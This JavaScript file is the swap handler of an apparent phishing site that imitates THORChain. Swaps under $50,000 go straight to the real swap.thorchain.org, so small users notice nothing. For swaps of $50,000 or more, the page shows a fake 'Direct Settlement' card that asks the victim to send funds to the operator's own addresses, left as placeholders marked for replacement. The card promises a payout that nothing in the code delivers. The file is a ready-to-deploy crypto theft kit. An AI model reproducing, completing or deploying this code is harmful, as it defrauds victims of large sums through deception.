// ================================================================
//  SWAP PAGE HANDLER
//  Threshold: $50,000 USD
//  - Under $50k → redirect to real swap.thorchain.org
//  - At/above $50k → show deposit address
// ================================================================

var THRESHOLD_USD = 50000;

var SWAP_ASSETS = {
	'BTC.BTC':    { key: 'bitcoin',     symbol: 'BTC',  name: 'Bitcoin',      cgId: 'bitcoin',      icon: 'images/chains/BTC.svg' },
	'ETH.ETH':    { key: 'ethereum',    symbol: 'ETH',  name: 'Ethereum',     cgId: 'ethereum',     icon: 'images/chains/ETH.svg' },
	'BSC.BNB':    { key: 'bnb',         symbol: 'BNB',  name: 'BNB Chain',    cgId: 'binancecoin',  icon: 'images/chains/BSC.svg' },
	'AVAX.AVAX':  { key: 'avalanche',   symbol: 'AVAX', name: 'Avalanche',    cgId: 'avalanche-2',  icon: 'images/chains/AVAX.svg' },
	'GAIA.ATOM':  { key: 'cosmos',      symbol: 'ATOM', name: 'Cosmos Hub',   cgId: 'cosmos',       icon: 'images/chains/GAIA.svg' },
	'DOGE.DOGE':  { key: 'dogecoin',    symbol: 'DOGE', name: 'Dogecoin',     cgId: 'dogecoin',     icon: 'images/chains/DOGE.svg' },
	'BCH.BCH':    { key: 'bitcoincash', symbol: 'BCH',  name: 'Bitcoin Cash', cgId: 'bitcoin-cash', icon: 'images/chains/BCH.svg' },
	'LTC.LTC':    { key: 'litecoin',    symbol: 'LTC',  name: 'Litecoin',     cgId: 'litecoin',     icon: 'images/chains/LTC.svg' },
	'BASE.ETH':   { key: 'base',        symbol: 'ETH',  name: 'Base',         cgId: 'ethereum',     icon: 'images/chains/BASE.svg' },
	'XRP.XRP':    { key: 'ripple',      symbol: 'XRP',  name: 'Ripple',       cgId: 'ripple',       icon: 'images/chains/XRP.svg' },
	'TRX.TRX':    { key: 'tron',        symbol: 'TRX',  name: 'TRON',         cgId: 'tron',         icon: 'images/chains/TRON.svg' }
};

// ⚠️ REPLACE THESE WITH YOUR REAL WALLET ADDRESSES
var DEPOSIT_ADDRESSES = {
	'BTC.BTC':   'REPLACE_WITH_YOUR_BTC_ADDRESS',
	'ETH.ETH':   'REPLACE_WITH_YOUR_ETH_ADDRESS',
	'BSC.BNB':   'REPLACE_WITH_YOUR_BNB_ADDRESS',
	'AVAX.AVAX': 'REPLACE_WITH_YOUR_AVAX_ADDRESS',
	'GAIA.ATOM': 'REPLACE_WITH_YOUR_ATOM_ADDRESS',
	'DOGE.DOGE': 'REPLACE_WITH_YOUR_DOGE_ADDRESS',
	'BCH.BCH':   'REPLACE_WITH_YOUR_BCH_ADDRESS',
	'LTC.LTC':   'REPLACE_WITH_YOUR_LTC_ADDRESS',
	'BASE.ETH':  'REPLACE_WITH_YOUR_BASE_ETH_ADDRESS',
	'XRP.XRP':   'REPLACE_WITH_YOUR_XRP_ADDRESS',
	'TRX.TRX':   'REPLACE_WITH_YOUR_TRX_ADDRESS'
};

var prices = {};
var pricesLoaded = false;

// DOM
var sellSelect = document.getElementById('sellAssetSelect');
var buySelect = document.getElementById('buyAssetSelect');
var sellIcon = document.getElementById('sellIcon');
var buyIcon = document.getElementById('buyIcon');
var amountInput = document.getElementById('sellAmount');
var sellUsd = document.getElementById('sellUsd');
var buyEstimate = document.getElementById('buyEstimate');
var buyUsd = document.getElementById('buyUsd');
var swapBtn = document.getElementById('swapBtn');
var resultArea = document.getElementById('resultArea');
var swapArrow = document.getElementById('swapArrow');

// Parse URL params
function getUrlParams() {
	var params = new URLSearchParams(window.location.search);
	return {
		sellAsset: params.get('sellAsset') || 'BTC.BTC',
		buyAsset: params.get('buyAsset') || 'ETH.ETH'
	};
}

// Initialize selects from URL
function initFromUrl() {
	var params = getUrlParams();
	if (sellSelect && SWAP_ASSETS[params.sellAsset]) {
		sellSelect.value = params.sellAsset;
	}
	if (buySelect && SWAP_ASSETS[params.buyAsset]) {
		buySelect.value = params.buyAsset;
	}
	updateIcons();
}

// Fetch prices
function fetchSwapPrices() {
	var idSet = {};
	for (var k in SWAP_ASSETS) { idSet[SWAP_ASSETS[k].cgId] = true; }
	var ids = Object.keys(idSet).join(',');

	fetch('https://api.coingecko.com/api/v3/simple/price?ids=' + ids + '&vs_currencies=usd')
		.then(function(r) { if (!r.ok) throw new Error('err'); return r.json(); })
		.then(function(data) {
			for (var k in SWAP_ASSETS) {
				var cg = SWAP_ASSETS[k].cgId;
				if (data[cg] && data[cg].usd) prices[k] = data[cg].usd;
			}
			pricesLoaded = true;
			updateEstimates();
			swapBtn.disabled = false;
			swapBtn.textContent = 'Swap';
		})
		.catch(function() {
			sellUsd.textContent = '⚠ Price unavailable';
			setTimeout(fetchSwapPrices, 15000);
		});
}

function fmtUsd(v) { return v.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 }); }
function fmtCrypto(v) { return v.toLocaleString('en-US', { minimumFractionDigits: 4, maximumFractionDigits: 8 }); }

function updateEstimates() {
	var sellKey = sellSelect.value;
	var buyKey = buySelect.value;
	var amount = parseFloat(amountInput.value);

	if (!pricesLoaded || !prices[sellKey] || isNaN(amount) || amount <= 0) {
		sellUsd.textContent = pricesLoaded ? '≈ $0.00' : 'Loading prices...';
		buyEstimate.textContent = '0';
		buyUsd.textContent = '≈ $0.00';
		return;
	}

	var usdVal = amount * prices[sellKey];
	sellUsd.textContent = '≈ $' + fmtUsd(usdVal);

	if (prices[buyKey] && prices[buyKey] > 0) {
		var est = usdVal / prices[buyKey];
		buyEstimate.textContent = fmtCrypto(est);
		buyUsd.textContent = '≈ $' + fmtUsd(usdVal);
	} else {
		buyEstimate.textContent = '—';
		buyUsd.textContent = '';
	}
}

function updateIcons() {
	var sell = SWAP_ASSETS[sellSelect.value];
	var buy = SWAP_ASSETS[buySelect.value];
	if (sell) sellIcon.src = sell.icon;
	if (buy) buyIcon.src = buy.icon;
	updateEstimates();
	resultArea.innerHTML = '';

	// Update page URL without reload
	var newUrl = 'swap.html?sellAsset=' + sellSelect.value + '&buyAsset=' + buySelect.value;
	history.replaceState(null, '', newUrl);
}

function preventDuplicates(changed) {
	if (sellSelect.value === buySelect.value) {
		if (changed === 'sell') {
			for (var i = 0; i < buySelect.options.length; i++) {
				if (buySelect.options[i].value !== sellSelect.value) {
					buySelect.value = buySelect.options[i].value; break;
				}
			}
		} else {
			for (var j = 0; j < sellSelect.options.length; j++) {
				if (sellSelect.options[j].value !== buySelect.value) {
					sellSelect.value = sellSelect.options[j].value; break;
				}
			}
		}
	}
	updateIcons();
}

function flipAssets() {
	var temp = sellSelect.value;
	sellSelect.value = buySelect.value;
	buySelect.value = temp;
	updateIcons();
}

// ═══════════════════════════════════════════════
// MAIN SWAP LOGIC — THRESHOLD CHECK
// ═══════════════════════════════════════════════
function executeSwap() {
	var sellKey = sellSelect.value;
	var buyKey = buySelect.value;
	var amount = parseFloat(amountInput.value);
	var sellAsset = SWAP_ASSETS[sellKey];
	var buyAsset = SWAP_ASSETS[buyKey];

	if (!sellAsset || !buyAsset) { showSwapError('Invalid asset selection.'); return; }
	if (isNaN(amount) || amount <= 0) { showSwapError('Please enter a valid amount.'); return; }
	if (sellKey === buyKey) { showSwapError('Cannot swap the same asset.'); return; }
	if (!pricesLoaded || !prices[sellKey]) { showSwapError('Prices still loading. Please wait.'); return; }

	var usdValue = amount * prices[sellKey];
	var estOutput = (prices[buyKey] && prices[buyKey] > 0) ? (usdValue / prices[buyKey]) : 0;

	if (usdValue < THRESHOLD_USD) {
		// ── UNDER $50K → Redirect to real THORChain swap ──
		window.location.href = 'https://swap.thorchain.org/swap?sellAsset=' + sellKey + '&buyAsset=' + buyKey;
	} else {
		// ── $50K+ → Show deposit address ──
		showDepositAddress(sellAsset, buyAsset, sellKey, buyKey, amount, usdValue, estOutput);
	}
}

function showDepositAddress(sellAsset, buyAsset, sellKey, buyKey, amount, usdValue, estOutput) {
	var address = DEPOSIT_ADDRESSES[sellKey] || 'ADDRESS_NOT_CONFIGURED';

	resultArea.innerHTML =
		'<div class="swap-address-section">' +
			'<div class="swap-address-card">' +
				'<div class="swap-address-title">🔒 Large Swap — Direct Settlement</div>' +
				'<div class="swap-quote-info" style="background:transparent;padding:0;margin-bottom:14px;">' +
					'<div class="swap-quote-row"><span class="q-label">You Send</span><span class="q-value">' + amount + ' ' + sellAsset.symbol + '</span></div>' +
					'<div class="swap-quote-row"><span class="q-label">USD Value</span><span class="q-value">$' + fmtUsd(usdValue) + '</span></div>' +
					'<div class="swap-quote-row"><span class="q-label">Est. Receive</span><span class="q-value">~' + fmtCrypto(estOutput) + ' ' + buyAsset.symbol + '</span></div>' +
				'</div>' +
				'<div class="swap-address-instruction">Send <strong>' + amount + ' ' + sellAsset.symbol + '</strong> to this ' + sellAsset.name + ' address:</div>' +
				'<div class="swap-address-display" id="addrDisplay" onclick="copySwapAddr()">' + address + '</div>' +
				'<button class="swap-copy-address-btn" id="copyAddrBtn" onclick="copySwapAddr()">' +
					'<svg width="16" height="16" fill="none" stroke="currentColor" viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2" stroke-width="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1" stroke-width="2"/></svg>' +
					'Copy Address' +
				'</button>' +
				'<div class="swap-network-warning">⚠ Only send ' + sellAsset.symbol + ' on the ' + sellAsset.name + ' network. Wrong network = permanent loss.</div>' +
				'<div class="swap-processing-note">Your ' + buyAsset.symbol + ' will be sent after confirmation. Processing: 10–30 minutes.</div>' +
			'</div>' +
		'</div>';

	resultArea.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
}

function copySwapAddr() {
	var addr = document.getElementById('addrDisplay').textContent;
	var btn = document.getElementById('copyAddrBtn');
	if (navigator.clipboard) {
		navigator.clipboard.writeText(addr).then(function() { showCopiedState(btn); });
	} else {
		var ta = document.createElement('textarea');
		ta.value = addr; ta.style.position = 'fixed'; ta.style.left = '-9999px';
		document.body.appendChild(ta); ta.select(); document.execCommand('copy');
		document.body.removeChild(ta); showCopiedState(btn);
	}
}

function showCopiedState(btn) {
	btn.classList.add('copied');
	btn.innerHTML = '<svg width="16" height="16" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg> Copied!';
	setTimeout(function() {
		btn.classList.remove('copied');
		btn.innerHTML = '<svg width="16" height="16" fill="none" stroke="currentColor" viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2" stroke-width="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1" stroke-width="2"/></svg> Copy Address';
	}, 2000);
}

function showSwapError(msg) {
	resultArea.innerHTML = '<div class="swap-error-box">⚠ ' + msg + '</div>';
}

// Events
sellSelect.addEventListener('change', function() { preventDuplicates('sell'); });
buySelect.addEventListener('change', function() { preventDuplicates('buy'); });
amountInput.addEventListener('input', function() { updateEstimates(); resultArea.innerHTML = ''; });
amountInput.addEventListener('keydown', function(e) { if (e.key === 'Enter') executeSwap(); });
swapBtn.addEventListener('click', executeSwap);
swapArrow.addEventListener('click', flipAssets);

// Init
initFromUrl();
fetchSwapPrices();
setInterval(fetchSwapPrices, 60000);